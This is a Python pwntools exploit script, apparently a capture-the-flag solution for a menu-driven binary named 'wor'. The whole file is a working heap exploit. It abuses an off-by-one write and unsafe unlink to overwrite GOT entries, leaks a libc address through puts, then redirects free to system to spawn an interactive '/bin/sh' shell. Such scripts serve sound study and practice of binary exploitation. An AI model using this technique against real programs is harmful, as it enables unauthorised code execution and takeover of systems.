#!/usr/bin/env python3

from pwn import *
#context.log_level = 'debug'

class ProbIO:

    MENU = "Your choice :"

    def __init__(self, r):
        self.r = r
        self.sla = lambda t, x: self.r.sendlineafter(t, x)
        self.sa = lambda t, x: self.r.sendafter(t, x)
    
    def sel1(self, choice, attr=None):
        self.sla(self.MENU, str(1))
        self.sla(self.MENU, str(choice))
        if attr is not None:
            self.sla(":", str(attr))
    
    def sel2(self, choice):
        self.sla(self.MENU, str(2))
        self.sla(self.MENU, str(choice))

    def sel3(self, choice, name=None):
        self.sla(self.MENU, str(3))
        self.sla(self.MENU, str(choice))
        if name is not None:
            self.sla(":", name)

    def sel4(self):
        self.sla(self.MENU, str(4))

    def shell(self):
        self.r.interactive()

class Primitives:

    def __init__(self, io):
        self.io = io

    def addRobot(self, *args, **kwargs): return self.io.sel1(*args, **kwargs)
    def delRobot(self, *args, **kwargs): return self.io.sel2(*args, **kwargs)
    def editRobot(self, *args, **kwargs): return self.io.sel3(*args, **kwargs)
    def startRobot(self, *args, **kwargs): return self.io.sel4(*args, **kwargs)

    def offbyone(self, byte):
        self.io.sla(self.io.MENU, str(1))

        self.byte = byte
        self.payload = "9999"
        self.payload += self.byte
        self.io.sa(self.io.MENU, self.payload)

def main(r, e, l):
    io = ProbIO(r)
    pri = Primitives(io)
    exploit(io, pri, e)
    io.shell()

def exploit(io, pri, e):
    pri.addRobot(2, 2)
    pri.addRobot(4)
    pri.delRobot(2)
    pri.addRobot(5)
    pri.offbyone("\x01")
    pri.delRobot(2)
    
    pri.addRobot(2, 2)
    ptr = 0x006030f0
    payload = p64(0x0) + p64(0x20)
    payload += p64(ptr - 0x18) + p64(ptr - 0x10)
    payload += p64(0x20)
    #pri.offbyone("\x01")
    pri.editRobot(2, payload)
    pri.delRobot(4) # unsafe-unlink
    io.sla(io.MENU, str(0)) # Why need dummy here?

    pri.addRobot(4)
    payload = p64(0x0)
    payload += p64(e.got['free'])
    pri.editRobot(2, payload)
    pri.editRobot(4, p64(e.plt['puts']))
    pri.editRobot(2, p64(0x0) + p64(e.got['read']))
    pri.delRobot(4)

    readOffset = 0x00000000000f7350
    libc = u64(io.r.recvn(6).ljust(8, b'\x00')) - readOffset
    assert libc & 0xfff == 0x0
    log.warn("libc: 0x%lx" % libc)

    pri.addRobot(4)
    systemOffset = 0x00000000000453a0
    pri.editRobot(2, p64(0x0) + p64(e.got['free']))
    pri.editRobot(4, p64(libc + systemOffset))
    pri.editRobot(5, "/bin/sh\x00")
    pri.delRobot(5)

if __name__ == "__main__":
    import argparse

    r = remote("127.0.0.1", 9929)
    e = ELF("./wor")
    main(r, e, None)
